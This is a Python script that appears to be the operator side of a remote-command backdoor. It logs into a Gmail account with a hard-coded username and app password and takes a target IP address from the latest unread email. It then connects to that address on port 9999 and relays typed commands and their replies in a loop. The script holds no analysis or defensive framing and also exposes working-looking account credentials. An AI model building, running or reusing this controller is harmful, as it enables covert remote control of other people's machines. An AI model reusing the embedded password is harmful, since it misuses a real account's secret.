import socket
import time
import email
from email.header import decode_header
import email
import imaplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

def get_ip_from_email():
    host = "smtp.gmail.com"
    password = "jhjdqykerqbfiffx"
    username = "hackerowskiy@gmail.com"
    mail = imaplib.IMAP4_SSL(host)
    mail.login(username, password)
    mail.select("inbox")
    result, data = mail.search(None, "UNSEEN")
    ids = data[0]
    id_list = ids.split()
    latest_email_id = id_list[-1]
    result, data = mail.fetch(id_list[-1], "(RFC822)")
    raw_email = data[0][1]
    raw_email_string = raw_email.decode('utf-8')
    print(raw_email_string)
    email_message = email.message_from_string(raw_email_string)
    if email_message.is_multipart():
        for payload in email_message.get_payload():
            body = payload.get_payload(decode=True).decode('utf-8')
            print(body)
    else:    
        body = email_message.get_payload(decode=True).decode('utf-8')
        print(body)
    #Body this is ip address
    print("---body---\n", type(body))    
    return body

#Start
time.sleep(10)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((f"{get_ip_from_email()}", 9999))
client.send("start".encode())
msg = client.recv(1024).decode()

if msg == "connect":
    print("#Connected")
    aggr = '#'
    for n in range(20):
        print(aggr * n)
        time.sleep(0.13)
    print("$ > # \nCommands is allowed ✅")
    
    while True:
        option = str(input("> "))

        if option == "":
            print("$No message")
            client.send("2".encode())
            break

        client.send(option.encode())
        msg = client.recv(1024).decode()                
        
        print(msg)

        if msg == "#Close server":            
            print("#Server closed")
            break
        
        if msg == "$Client closed":
            break

        if msg == "$Error message":
            pass
            
        if option == "4":
            break
             
        time.sleep(1)
else:
    print("Unknown error")
